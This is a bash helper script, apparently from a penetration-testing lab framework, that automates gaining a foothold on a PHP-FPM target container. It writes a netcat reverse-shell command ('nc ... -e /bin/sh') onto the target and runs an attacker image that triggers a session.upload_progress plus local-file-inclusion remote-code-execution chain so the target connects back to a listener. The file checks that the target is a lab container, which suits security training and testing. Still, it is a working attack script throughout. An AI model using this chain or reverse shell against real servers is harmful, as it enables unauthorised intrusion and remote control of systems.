# shellcheck shell=bash
# Lab foothold: Chain-A RCE (upload_progress + LFI) on the FPM target → nc back
# to the engage listener. Uses `docker run --network <target-net>` so it works
# regardless of compose project naming (p2s vs folder name).

engage_lab_foothold_container() {
  printf '%s' "${ENGAGE_LAB_TARGET_CONTAINER:-vtbw-php2shell-target}"
}

engage_lab_foothold_attacker_image() {
  printf '%s' "${ENGAGE_LAB_ATTACKER_IMAGE:-php2shell-unchained-attacker:latest}"
}

engage_lab_foothold_supported() {
  command -v docker >/dev/null 2>&1 || return 1
  local c; c="$(engage_lab_foothold_container)"
  docker ps --format '{{.Names}}' | grep -qx "$c" || return 1
  engage_target_is_lab
}

engage_lab_foothold_exec_rce() {
  local lhost="$1" lport="$2"
  local c; c="$(engage_lab_foothold_container)"
  # shellcheck source=scripts/lib/compose-networks.sh
  source "$LAB_ROOT/scripts/lib/compose-networks.sh"
  local net; net="$(p2s_target_network)"
  [[ -z "$net" ]] && { echo "[foothold-lab] FEHLER: target-Netz nicht gefunden" >&2; return 1; }
  local img; img="$(engage_lab_foothold_attacker_image)"
  docker image inspect "$img" >/dev/null 2>&1 || { echo "[foothold-lab] FEHLER: Image $img fehlt — vtbw-php2shell-lab up" >&2; return 1; }

  local script="/tmp/p2s-foothold-$$.sh"
  docker exec "$c" bash -c "printf '%s\n' 'nc ${lhost} ${lport} -e /bin/sh' > '$script' && chmod 755 '$script'" || return 1
  echo "[foothold-lab] RCE one-shot auf Netz: $net (Image: $img)"
  docker run --rm --network "$net" \
    -v "$LAB_ROOT/attacker/scripts:/opt/lab/scripts:ro" \
    "$img" \
    python3 /opt/lab/scripts/chain_a_session_lfi.py -t target -p 80 \
      -c "sh $script" 2>&1
}

engage_lab_foothold_note() {
  cat <<'NOTE'
[foothold-lab] RCE-Kette (session.upload_progress + LFI) → Ziel führt `nc` zum Listener aus.
  Erwartung: Fenster **listener** im tmux zeigt connect + `whoami`.
  Kein Connect: Port blockiert? Lab-Bridge-GW falsch? → ENGAGE_LAB_BRIDGE_GW=… überschreiben.
NOTE
}
